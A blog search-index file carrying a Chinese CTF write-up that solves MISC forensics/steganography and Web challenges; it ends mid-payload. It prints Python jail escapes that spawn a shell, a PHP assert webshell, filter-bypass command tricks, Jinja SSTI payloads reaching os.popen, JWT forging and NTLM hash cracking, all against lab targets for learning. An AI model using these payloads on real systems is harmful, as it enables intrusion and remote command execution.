<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Fhacker wp</title>
    <link href="/2025/03/24/FHACKER%20wp/"/>
    <url>/2025/03/24/FHACKER%20wp/</url>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="ez-jpg"><a href="#ez-jpg" class="headerlink" title="ez_jpg"></a><strong>ez_jpg</strong></h3><p>Base64解码，开头为9DFF，反过来为FFD9，是jpg的文件尾</p><p><img src="/../images/192434.png" alt="192434"> </p><p>使用反转工具</p><p><img src="/../images/200409.png" alt="200409"> </p><p>导入到010</p><p><img src="/../images/193807.png" alt="193807">   </p><p>是一张杂乱的图片</p><p> <img src="/../images/flag1.jpg" alt="flag1"> </p><p>再拖进010</p><p><img src="/../images/001852.png" alt="001852"> </p><p>修改宽高</p><p><img src="/../images/003603.png" alt="003603"> </p><p><img src="/../images/wps6.png" alt="img">  </p><p>SYC{Steg_4nd_Zip_1s_G00d!}</p><h3 id="Truth-of-Word"><a href="#Truth-of-Word" class="headerlink" title="Truth of Word"></a><strong>Truth of Word</strong></h3><p>（1）</p><p><img src="/../images/202053.png" alt="202053"> </p><p>Flag01&#x3D;SYC{W0rd_H@5</p><p>（2）</p><p>改后缀名，.docx改为.zip</p><p><img src="/../images/152005.png" alt="152005"> </p><p>.bin文件，改后缀为zip</p><p><img src="/../images/151931.png" alt="151931"> </p><p><img src="/../images/202908.png" alt="202908"> </p><p>Flag02 &#x3D; @_Ama1n9</p><p>（3）</p><p><img src="/../images/201853.png" alt="201853">      <img src="/../images/wps12.jpg" alt="wps12">  </p><p> FLAG03&#x3D;StrUCtu3e!}</p><p>SYC{W0rd_H@5@_Ama1n9_StrUCtu3e!}</p><h3 id="ez-pcap-1"><a href="#ez-pcap-1" class="headerlink" title="ez_pcap_1"></a><strong>ez_pcap_1</strong></h3><p>SMB文件</p><p><img src="/../images/wps13.jpg" alt="wps13"><img src="/../images/wps14.jpg" alt="wps14"> </p><h3 id="雪"><a href="#雪" class="headerlink" title="雪"></a><strong>雪</strong></h3><p>zip拖进010</p><p><img src="/../images/220739.png" alt="220739"> </p><p>base64解码  W3LC0M4，是文件的密码</p><p>盲水印提取</p><p><img src="/../images/190323.png" alt="190323"> </p><p>Th1si4st8eK3y</p><p>随波逐流，雪花隐写</p><p><img src="/../images/183632.png" alt="183632"></p><p><img src="/../images/wps18.jpg" alt="wps18"> </p><h3 id="舔狗的觉醒"><a href="#舔狗的觉醒" class="headerlink" title="舔狗的觉醒"></a><strong>舔狗的觉醒</strong></h3><p>密码爆破</p><p><img src="/../images/221103.png" alt="221103"> </p><p>50 4b 03 04是zip的文件头</p><p>每两位左右交换</p><p><img src="/../images/221144.png" alt="221144"> </p><p>AI脚本</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs vim">import os<br>desktop_path = os.path.<span class="hljs-keyword">join</span>(os.path.expanduser(<span class="hljs-string">&quot;~&quot;</span>), <span class="hljs-string">&quot;Desktop&quot;</span>)<br>file_path = os.path.<span class="hljs-keyword">join</span>(desktop_path, <span class="hljs-string">&#x27;byte-revenge.txt&#x27;</span>)<br><br><span class="hljs-keyword">try</span>:<br>    with <span class="hljs-keyword">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-keyword">file</span>:<br>        data = <span class="hljs-keyword">file</span>.<span class="hljs-keyword">read</span>().<span class="hljs-keyword">split</span>()<br><br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i in data:<br>        <span class="hljs-keyword">res</span> = i[::-<span class="hljs-number">1</span>]<br>        result += <span class="hljs-keyword">res</span><br>    <span class="hljs-keyword">print</span>(result)<br><br>    swapped_data = [byte[::-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> byte in data]<br><br>    output_file_path = os.path.<span class="hljs-keyword">join</span>(desktop_path, <span class="hljs-string">&#x27;byte-revenge.txt&#x27;</span>)<br>    with <span class="hljs-keyword">open</span>(output_file_path, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-keyword">file</span>:<br>        <span class="hljs-keyword">file</span>.<span class="hljs-keyword">write</span>(result)<br><br>    <span class="hljs-keyword">print</span>(<span class="hljs-keyword">f</span><span class="hljs-string">&quot;&#123;output_file_path&#125;&quot;</span>)<br>except FileNotFoundError:<br>    <span class="hljs-keyword">print</span>(<span class="hljs-keyword">f</span><span class="hljs-string">&quot;错误：找不到文件 &#123;file_path&#125;&quot;</span>)<br>except IOError <span class="hljs-keyword">as</span> <span class="hljs-keyword">e</span>:<br>    <span class="hljs-keyword">print</span>(<span class="hljs-keyword">f</span><span class="hljs-string">&quot;IO错误: &#123;e&#125;&quot;</span>)<br>except Exception <span class="hljs-keyword">as</span> <span class="hljs-keyword">e</span>:<br>    <span class="hljs-keyword">print</span>(<span class="hljs-keyword">f</span><span class="hljs-string">&quot;发生了未预料的错误: &#123;e&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><p>得到pdf文件</p><p><img src="/../images/221443.png" alt="221443"> </p><p>把图片拖走</p><p><img src="/../images/190625.png" alt="190625"> </p><p>SYC{Y0u_arE_y0uR_0wn_hero}</p><h3 id="cimbar"><a href="#cimbar" class="headerlink" title="cimbar"></a><strong>cimbar</strong></h3><p><img src="/../images/wps24.jpg" alt="wps24"><img src="/../images/212556.png" alt="212556"> </p><p><img src="/../images/193509.png" alt="193509"> </p><h3 id="乌龟"><a href="#乌龟" class="headerlink" title="乌龟"></a><strong>乌龟</strong></h3><p>SSTV扫描，得到图片</p><p><img src="/../images/wps27.jpg" alt="wps27"> </p><p>PASS:Be4uti7ulSun5e7密钥</p><p><img src="/../images/195521.png" alt="195521"> </p><p>得到serect.txt</p><p><img src="/../images/195714.png" alt="195714"> </p><p>看不懂，问AI，这段代码是用 Logo 语言编写的</p><p>找一个在线工具</p><p><img src="/../images/172303.png" alt="172303"> </p><p>SYC{TU3T1E_P4INTING}</p><h3 id="Welcome-jail"><a href="#Welcome-jail" class="headerlink" title="Welcome_jail"></a><strong>Welcome_jail</strong></h3><p>连接靶机</p><p> <img src="/../images/image-20250325191104302.png" alt="image-20250325191104302"></p><p> 看到过滤 <code>[&#39;import&#39;, &#39;os&#39;, &#39;00&#39;]</code></p><p><code>open(chr(102)+chr(108)+chr(97)+chr(103)).read()</code><img src="/../images/image-20250325191944908.png" alt="image-20250325191944908">     </p><p>flag不在&#x2F;flag文件中</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">print(<span class="hljs-name">__builtins__</span>.__dict__[&#x27;eval&#x27;](<span class="hljs-name">__import__</span>(&#x27;os&#x27;).popen(&#x27;cat /home/ctf/flag&#x27;).read()))<br></code></pre></td></tr></table></figure><p>用chr绕过</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">print</span>(__builtins__.__dict__[bytes([<span class="hljs-number">101</span>,<span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">108</span>]).decode()](bytes([<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">105</span>,<span class="hljs-number">109</span>,<span class="hljs-number">112</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">116</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">40</span>,<span class="hljs-number">39</span>,<span class="hljs-number">111</span>,<span class="hljs-number">115</span>,<span class="hljs-number">39</span>,<span class="hljs-number">41</span>,<span class="hljs-number">46</span>,<span class="hljs-number">112</span>,<span class="hljs-number">111</span>,<span class="hljs-number">112</span>,<span class="hljs-number">101</span>,<span class="hljs-number">110</span>,<span class="hljs-number">40</span>,<span class="hljs-number">39</span>,<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">47</span>,<span class="hljs-number">104</span>,<span class="hljs-number">111</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">47</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">102</span>,<span class="hljs-number">47</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">39</span>,<span class="hljs-number">41</span>,<span class="hljs-number">46</span>,<span class="hljs-number">114</span>,<span class="hljs-number">101</span>,<span class="hljs-number">97</span>,<span class="hljs-number">100</span>,<span class="hljs-number">40</span>,<span class="hljs-number">41</span>]).decode()))<br></code></pre></td></tr></table></figure><p><img src="/../images/image-20250326205603652.png" alt="image-20250326205603652"> </p><p>还有一种方法，获取<code>os._wrap_close</code>  类下标</p><p>需要写脚本获取下标数，但我不会</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">([].__class__.__base__.__subclasses__()</span></span><span class="hljs-selector-attr">[-4]</span>.__init__.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;popen&#x27;</span>]</span>(<span class="hljs-string">&#x27;env&#x27;</span>)<span class="hljs-selector-class">.read</span>())<br></code></pre></td></tr></table></figure><p>还是用chr绕过</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">print([].__class__.__base__.__subclasses__()[<span class="hljs-number">-4</span>].__init__.__globals__[chr(<span class="hljs-number">112</span>)+chr(<span class="hljs-number">111</span>)+chr(<span class="hljs-number">112</span>)+chr(<span class="hljs-number">101</span>)+chr(<span class="hljs-number">110</span>)](<span class="hljs-name">chr</span>(<span class="hljs-number">101</span>)+chr(<span class="hljs-number">110</span>)+chr(<span class="hljs-number">118</span>)).read())<br></code></pre></td></tr></table></figure><h3 id="hard-jail"><a href="#hard-jail" class="headerlink" title="hard_jail"></a>hard_jail</h3><p>![屏幕截图 2025-03-31 021232](..&#x2F;images&#x2F;屏幕截图 2025-03-31 021232.png) </p><p>非预期，黑名单置空black&#x3D;[]</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>)<span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;sh&#x27;</span>)    <span class="hljs-comment">//用户可以在这个会话中输入和执行各种系统命令。</span><br></code></pre></td></tr></table></figure><p>直接env得到flag</p><p>![](..&#x2F;images&#x2F;屏幕截图 2025-03-31 021702.png) </p><p>或ls        </p><p>![屏幕截图 2025-03-31 021529](..&#x2F;images&#x2F;屏幕截图 2025-03-31 021529.png) </p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> . -<span class="hljs-built_in">name</span> f*            <span class="hljs-comment">//查找所有f开头的文件</span><br><span class="hljs-built_in">find</span> . -<span class="hljs-built_in">name</span> <span class="hljs-string">&quot;flag&quot;</span><br><br>cat /home/ctf/<span class="hljs-built_in">flag</span><br></code></pre></td></tr></table></figure><p>![屏幕截图 2025-03-31 021832](..&#x2F;images&#x2F;屏幕截图 2025-03-31 021832.png) </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(__import__(<span class="hljs-string">&#x27;os&#x27;</span>)</span></span><span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-selector-class">.read</span>())<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(__import__(<span class="hljs-string">&#x27;os&#x27;</span>)</span></span><span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;env&#x27;</span>)<span class="hljs-selector-class">.read</span>())<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>)<span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;env|grep SYC&#x27;</span>)      <br><span class="hljs-comment">//grep 用于在文本中搜索匹配特定模式的行，这里的模式是 SYC。在所有环境变量中查找包含 SYC 的变量，并将匹配的行输出。</span><br></code></pre></td></tr></table></figure><h3 id="Secret-of-Starven"><a href="#Secret-of-Starven" class="headerlink" title="Secret of Starven"></a>Secret of Starven</h3><p><a href="https://blog.csdn.net/qq_30464257/article/details/142205308">SMB流量分析-CSDN博客</a></p><p>该SMB部分采用了NTLM协议进行身份验证，需要从流量包中提取NTLM协议各部分数据</p><p>导出SMB对象</p><p>![屏幕截图 2025-03-30 171550](..&#x2F;images&#x2F;屏幕截图 2025-03-30 171550.png)</p><p>发现两个文件，jpg没用，zip加密了</p><p>这题类似于护网杯的谍影重重</p><p>![屏幕截图 2025-03-30 171512](..&#x2F;images&#x2F;屏幕截图 2025-03-30 171512.png) </p><p>直接用NTLMRawUnHide一把梭</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python NTLMRawUnHide<span class="hljs-selector-class">.py</span> -<span class="hljs-selector-tag">i</span> Starven.pcapng<br></code></pre></td></tr></table></figure><p>![屏幕截图 2025-03-30 203051](..&#x2F;images&#x2F;屏幕截图 2025-03-30 203051.png)</p><p>![屏幕截图 2025-03-30 203100](..&#x2F;images&#x2F;屏幕截图 2025-03-30 203100.png)</p><p>得到最终的哈希码，写入1.txt</p><p>Hashcat是一款强大的密码破解工具，用Hashcat和kali自带的rockyou.txt进行爆破</p><p>![屏幕截图 2025-03-31 004906](..&#x2F;images&#x2F;屏幕截图 2025-03-31 004906.png) </p><p>![屏幕截图 2025-03-31 004949](..&#x2F;images&#x2F;屏幕截图 2025-03-31 004949.png) </p><p>得到密码spellorstarve，打开文件得到flag</p><p>也可以直接用ARCHPR爆破</p><p>![屏幕截图 2025-03-31 010611](..&#x2F;images&#x2F;屏幕截图 2025-03-31 010611.png) </p><p><a href="https://blog.csdn.net/2301_79200709/article/details/143518195">2024强网杯-谍影重重5.0_强网杯wp-CSDN博客</a></p><h3 id="友谊地久天长"><a href="#友谊地久天长" class="headerlink" title="友谊地久天长"></a>友谊地久天长</h3><p>有一张损坏的图片，放到随波逐流，发现文件头被修改                                                               <img src="/../images/44F2E635@A84FA51-%E4%BF%AE%E5%A4%8D%E6%96%87%E4%BB%B6%E5%A4%B4.png" alt="44F2E635@A84FA51-修复文件头"></p><p>得到的图片不全，再放到随波逐流 ，发现CRC结果，AT应为IDAT                                                                                          <img src="/../images/image-20250325001412774.png" alt="image-20250325001412774"></p><p>放到010，变成IDAT，49 44 41 54                                                                                                          <img src="/../images/image-20250325001631142.png" alt="image-20250325001631142"></p><p>修复后得到完整的二维码，扫出来是 Super_Snow_Sword_is_so_handsome!</p><p><img src="/../images/44F2E635@A840FA51-%E4%BF%AE%E5%A4%8D%E6%96%87%E4%BB%B6%E5%A4%B4.png" alt="44F2E635@A840FA51-修复文件头">    </p><p>另一个是 .crypto文件，没见过，搜索一下</p><p><img src="/../images/image-20250324235215871.png" alt="image-20250324235215871">                                                                                                                                下载Encrypto，密码为上面二维码扫出的内容</p><p><img src="/../images/image-20250324235438757.png" alt="image-20250324235438757">         </p><p>得到一个mp3文件，但这个音频没用…..</p><p><img src="/../images/image-20250324235650031.png" alt="image-20250324235650031">  </p><p>foremost文件提取出一张图片                                                                              <img src="/../images/00000002.png" alt="00000002"></p><p>LSB隐写                                                                                 ![Blue plane 0](..&#x2F;images&#x2F;Blue plane 0.bmp)</p><p>中间有字，放到stegsolve里的Stereogram Solver:立体试图 左右控制偏移                       <img src="/../images/solved.bmp" alt="solved"></p><h3 id="史上最没节操的游戏"><a href="#史上最没节操的游戏" class="headerlink" title="史上最没节操的游戏"></a><strong>史上最没节操的游戏</strong></h3><p><strong>（1）游乐园</strong></p><p>wireshark，http</p><p><img src="/../images/image-20250327224122359.png" alt="image-20250327224122359">        </p><p><img src="/../images/image-20250327224720879.png" alt="image-20250327224720879"> </p><p><strong>（2）电影院</strong></p><p>音频里有电报声，去bilibili下载原音频，用AU分离，反相</p><p><img src="/../images/image-20250327231335894.png" alt="image-20250327231335894"> </p><p>SSTV扫描 </p><p><img src="/../images/2025-03-27_23.31.26.jpg" alt="2025-03-27_23.31.26"> </p><p>访问<a href="https://www.cnblogs.com/handsomesnowsword">https://www.cnblogs.com/handsomesnowsword</a>，不断刷新</p><p><img src="/../images/002451.png" alt="002451"> </p><p>_YPneR:2galf</p><p>flag2:RenPY_</p><p><strong>（3）漫展</strong></p><p>用aleappGUI进行手机取证</p><p><img src="/../images/230740.png" alt="230740"></p><p>手机热点</p><p><img src="/../images/230842.png" alt="230842"></p><p><img src="/../images/230925.png" alt="230925"> </p><p>欠了多少钱，250000</p><p><img src="/../images/231037.png" alt="231037"></p><p>欠的是谁的钱，电话号码为1231231233，QB</p><p><img src="/../images/231402.png" alt="231402"></p><p>在哪里，下北沢</p><p><img src="/../images/231530.png" alt="231530"> </p><p>浏览记录</p><p><img src="/../images/231750.png" alt="231750"></p><p>访问</p><p><img src="/../images/231937.png" alt="231937"> </p><p>藏头诗  FLAG3:WHERE_YOU_CAN_</p><p><strong>（4）法庭</strong></p><p>内存取证</p><p><img src="/../images/233844.png" alt="233844"> </p><p><img src="/../images/234246.png" alt="234246"> </p><p>netscan</p><p><img src="/../images/234359.png" alt="234359"></p><p><img src="/../images/234515.png" alt="234515"> </p><p><strong>flag4</strong></p><p><img src="/../images/image-20250328235259949.png" alt="image-20250328235259949"> </p><p>xyzzz   fjuth</p><p>维吉尼亚解密</p><p><img src="/../images/2021041215573434.png" alt="2021041215573434"> </p><p>提取码为前四位 ILVUI</p><p>flag4：have_fun_</p><p><img src="/../images/image-20250328235345158.png" alt="image-20250328235345158"> </p><p>看作者的QQ空间，324</p><p>flag{welcome_to_RenPY_WHERE_YOU_CAN_have_fun_324}</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="100-的圆"><a href="#100-的圆" class="headerlink" title="100%的圆"></a><strong>100%的圆</strong></h3><p><img src="/../images/wps35.jpg" alt="wps35"> </p><p>Base64解码</p><p><img src="/../images/wps36.jpg" alt="wps36"> </p><h3 id="ez-http"><a href="#ez-http" class="headerlink" title="ez-http"></a><strong>ez-http</strong></h3><p>cookie用了JWT加密，hasFlag为 false，需要将其改为true</p><p><img src="/../images/154935.png" alt="154935"> </p><p>AI脚本</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import jwt<br><br>jwt_str = <span class="hljs-string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJTdGFydmVuIiwiYXVkIjoiQ3RmZXIiLCJpYXQiOjE3NDI2Mjk1MzcsIm5iZiI6MTc0MjYyOTUzNywiZXhwIjoxNzQyNjM2NzM3LCJ1c2VybmFtZSI6IlN0YXJ2ZW4iLCJwYXNzd29yZCI6InF3ZXJ0MTIzNDU2IiwiaGFzRmxhZyI6ZmFsc2V9.csx6eAcIoaJ5bVF6zPfXcunjJ4rPzxCpn-jxC0RASic&quot;</span><br><span class="hljs-comment"># 对称密钥</span><br>secret_key = <span class="hljs-string">&quot;Starven_secret_key&quot;</span><br><br><span class="hljs-comment"># 解码 JWT，不验证签名</span><br>decoded = jwt.decode(jwt_str, options=&#123;<span class="hljs-string">&quot;verify_signature&quot;</span>: <span class="hljs-literal">False</span>&#125;)<br><br><span class="hljs-comment"># 修改 hasFlag 的值为 true</span><br>decoded[<span class="hljs-string">&#x27;hasFlag&#x27;</span>] = <span class="hljs-literal">True</span><br><br><span class="hljs-comment"># 使用对称密钥重新编码 JWT</span><br>new_jwt = jwt.encode(decoded, <span class="hljs-attribute">key</span>=secret_key, <span class="hljs-attribute">algorithm</span>=<span class="hljs-string">&#x27;HS256&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;新的 JWT 字符串:&quot;</span>)<br><span class="hljs-built_in">print</span>(new_jwt)<br></code></pre></td></tr></table></figure><p> <img src="/../images/154735.png" alt="154735"></p><h3 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby_upload"></a><strong>baby_upload</strong></h3><p>白名单后缀绕过，只对第一个后缀名进行了黑名单检测</p><p><img src="/../images/164501.png" alt="164501"> </p><p>返回为空，上传成功</p><p><img src="/../images/164608.png" alt="164608"> </p><p>蚁剑访问</p><p><img src="/../images/163527.png" alt="163527"> </p><h3 id="SecretInDrivingSchool"><a href="#SecretInDrivingSchool" class="headerlink" title="SecretInDrivingSchool"></a><strong>SecretInDrivingSchool</strong></h3><p><img src="/../images/210726.png" alt="210726"> </p><p>访问&#x2F;L000G1n.php</p><p><img src="/../images/210758.png" alt="210758">                    </p><p>密码猜是SYC….</p><p>进入后台，广告修改，传个一句话木马，eval被过滤了，用assert</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/202934.png" alt="202934"> </p><p>再回到首页直接cat flag</p><p><img src="/../images/204128.png" alt="204128"> </p><p><img src="/../images/204132.png" alt="204132"> </p><p>或</p><p><img src="/../images/204640.png" alt="204640"> </p><p>或</p><p>字符串拼接起来执行就能绕过</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$a = <span class="hljs-string">&#x27;syst&#x27;</span> . <span class="hljs-string">&#x27;em&#x27;</span><span class="hljs-comment">;</span><br>$a(<span class="hljs-string">&#x27;env&#x27;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function">echo <span class="hljs-title">readgzfile</span><span class="hljs-params">(<span class="hljs-string">&quot;/flag&quot;</span>)</span></span>;<br><span class="hljs-comment">//readgzfile 函数会尝试打开并读取指定路径的 gzip 压缩文件，然后把文件内容输出到标准输出（通常是浏览器页面）。</span><br></code></pre></td></tr></table></figure><p>或</p><p>过滤了eval，system，用 &#96;&#96; 执行系统命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> `<span class="hljs-built_in">cat</span> /flag`;<br></code></pre></td></tr></table></figure><h3 id="Can-you-Pass-Me"><a href="#Can-you-Pass-Me" class="headerlink" title="Can_you_Pass_Me"></a>Can_you_Pass_Me</h3><p>SSTI</p><p>一把梭 env|base64</p><p><img src="/../images/image-20250325212450109.png" alt="image-20250325212450109"></p><p>base64解码</p><p><img src="/../images/image-20250325212602797.png" alt="image-20250325212602797"></p><p>或</p><p>ls读取目录</p><p><img src="/../images/image-20250325212711596.png" alt="image-20250325212711596"></p><p>读取app.py查看源码</p><p><img src="/../images/image-20250325212759126.png" alt="image-20250325212759126"> </p><p>AI分析代码</p><p><img src="/../images/image-20250325213528234.png" alt="image-20250325213528234"></p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(lipsum<span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&#x27;__glob&#x27;</span><span class="hljs-string">&#x27;als__&#x27;</span>)<span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&#x27;__g&#x27;</span><span class="hljs-string">&#x27;et&#x27;</span><span class="hljs-string">&#x27;item__&#x27;</span>)(<span class="hljs-string">&#x27;o&#x27;</span><span class="hljs-string">&#x27;s&#x27;</span>))<span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&#x27;pop&#x27;</span><span class="hljs-string">&#x27;en&#x27;</span>)(<span class="hljs-string">&#x27;cd ..;cat f*&#x27;</span>)<span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&#x27;re&#x27;</span><span class="hljs-string">&#x27;ad&#x27;</span>)()<span class="hljs-punctuation">|</span>list<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">//结果中不能包含flag文件内容，通过list来转换为列表绕过（将字符拼接输出）</span><br><span class="language-xml">//cd ..;cat f*     返回上级目录；f*为通配符，*表示匹配任意字符序列，f*会匹配到所有以f开头的文件</span><br></code></pre></td></tr></table></figure><p>也可以一个个查</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">当前类      </span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&quot;__c&quot;</span><span class="hljs-string">&quot;lass__&quot;</span>))<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml">基类        </span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&quot;__c&quot;</span><span class="hljs-string">&quot;lass__&quot;</span>)<span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&quot;__b&quot;</span><span class="hljs-string">&quot;ase__&quot;</span>))<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml">基类的子类   </span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&quot;__c&quot;</span><span class="hljs-string">&quot;lass__&quot;</span>)<span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&quot;__b&quot;</span><span class="hljs-string">&quot;ase__&quot;</span>)<span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&quot;__subc&quot;</span><span class="hljs-string">&quot;lasses__&quot;</span>)())<span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><p>然后写脚本获取下标</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&#x27;__cla&#x27;</span><span class="hljs-string">&#x27;ss__&#x27;</span>)<span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&#x27;__ba&#x27;</span><span class="hljs-string">&#x27;se__&#x27;</span>)<span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&#x27;__subcla&#x27;</span><span class="hljs-string">&#x27;sses__&#x27;</span>)()<span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&#x27;po&#x27;</span><span class="hljs-string">&#x27;p&#x27;</span>)(<span class="hljs-number">140</span>)<span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&#x27;__in&#x27;</span><span class="hljs-string">&#x27;it__&#x27;</span>)<span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&#x27;__glob&#x27;</span><span class="hljs-string">&#x27;als__&#x27;</span>)<span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&#x27;po&#x27;</span><span class="hljs-string">&#x27;p&#x27;</span>)(<span class="hljs-string">&#x27;po&#x27;</span><span class="hljs-string">&#x27;p&#x27;</span><span class="hljs-string">&#x27;en&#x27;</span>)(<span class="hljs-string">&#x27;env|ba&#x27;</span><span 